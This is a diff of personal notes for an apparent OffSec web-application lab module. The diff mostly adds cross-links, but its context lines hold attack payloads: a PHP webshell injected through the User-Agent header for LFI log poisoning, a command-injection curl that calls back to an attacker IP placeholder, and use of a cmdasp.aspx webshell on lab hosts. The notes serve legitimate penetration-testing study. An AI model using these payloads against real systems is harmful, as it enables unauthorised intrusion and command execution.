@@ -152,6 +152,7 @@ ssh -i dt_key -p 2222 offsec@mountaindesserts.local
 #### Tags: #LFI #EtcPasswd #SSHKeyTheft #CurlVsBrowser #WindowsTraversal #IISLogPaths #WebConfig
 
 > 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
+> 🧭 Quick lookup: [[File Inclusion & Traversal (Decision Tree)|Decision Tree]]
 
 ---
 
@@ -268,6 +269,8 @@ Browse the app with Burp proxying, click **Admin**, find that request in **Proxy
 <?php echo system($_GET['cmd']); ?>
 ```
 *Replace the `User-Agent` header value with this exact string, then click **Send**. This gets written verbatim into `access.log`. Apache doesn't care that it looks like code, it just logs it as text.*
+
+> 🔍 Full breakdown of why `access.log`/`User-Agent` specifically, and why this only works with LFI (not plain traversal): [[File Inclusion & Traversal (Breakdowns)#LFI + log poisoning: why access.log and User-Agent specifically|Command Breakdowns]]
 
 ![[Pasted image 20260731232121.png]]
 
@@ -762,6 +765,7 @@ ssh -p 2222 -i fileup root@mountaindesserts.local
 #### Tags: #Lab #Quiz #Module9
 
 > 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
+> 🧭 Quick lookup: [[File Upload Attacks (Decision Tree)|Decision Tree]]
 
 ---
 
@@ -891,6 +895,8 @@ curl -X POST --data 'username=test&password=test&ffa={{7*7}}' http://<target>/lo
 
 *Along the way, noticed double quotes (`"`) were silently stripped from the reflected value but single quotes (`'`) survived. Worth remembering as its own signal: a character vanishing rather than getting HTML-escaped means something is actively filtering it, not just echoing.*
 
+> 🔍 Full breakdown of why this exact test ordering (arithmetic → template → shell metacharacters) and why a blank response is itself a signal: [[Web Applications (Breakdowns)#Systematic injection-type elimination when there's no obvious hint|Command Breakdowns]]
+
 **Step 4: Reconsider, test plain OS shell metacharacters instead of Python/Jinja2 syntax**
 ```bash
 curl -X POST --data-urlencode 'ffa=`curl http://<your_ip>:8888/pwned2`' --data 'username=test&password=test' http://<target>/login
@@ -953,6 +959,8 @@ curl http://<target>/cmdasp.aspx
 **Step 5: Use the webshell directly in the browser**
 Type a command into its **Command** field and click **execute**. `whoami` confirmed execution as `iis apppool\defaultapppool`. No need for a full reverse shell here since the webshell itself gives command execution directly.
 
+> 📸 Screenshot: the `cmdasp.aspx` webshell's Command field with `whoami` output showing, a nice clean one for a report since the whole exploit fits in one browser window
+
 **Step 6: Find and read the flag**
 ```
 dir C:\inetpub\ /s /b
@@ -977,7 +985,7 @@ type C:\inetpub\flag.txt
 #### Tags: #Lab #Quiz #Module9
 
 > 📋 Generalized copy-pasteable commands for this technique: [[Linux Methodology#Step 1b: Web Application Exploitation]]
-> 🧭 Quick lookup: [[DECISION TREE]]
+> 🧭 Quick lookup: [[Web Applications (Decision Tree)|Decision Tree]]
 
 ---
 
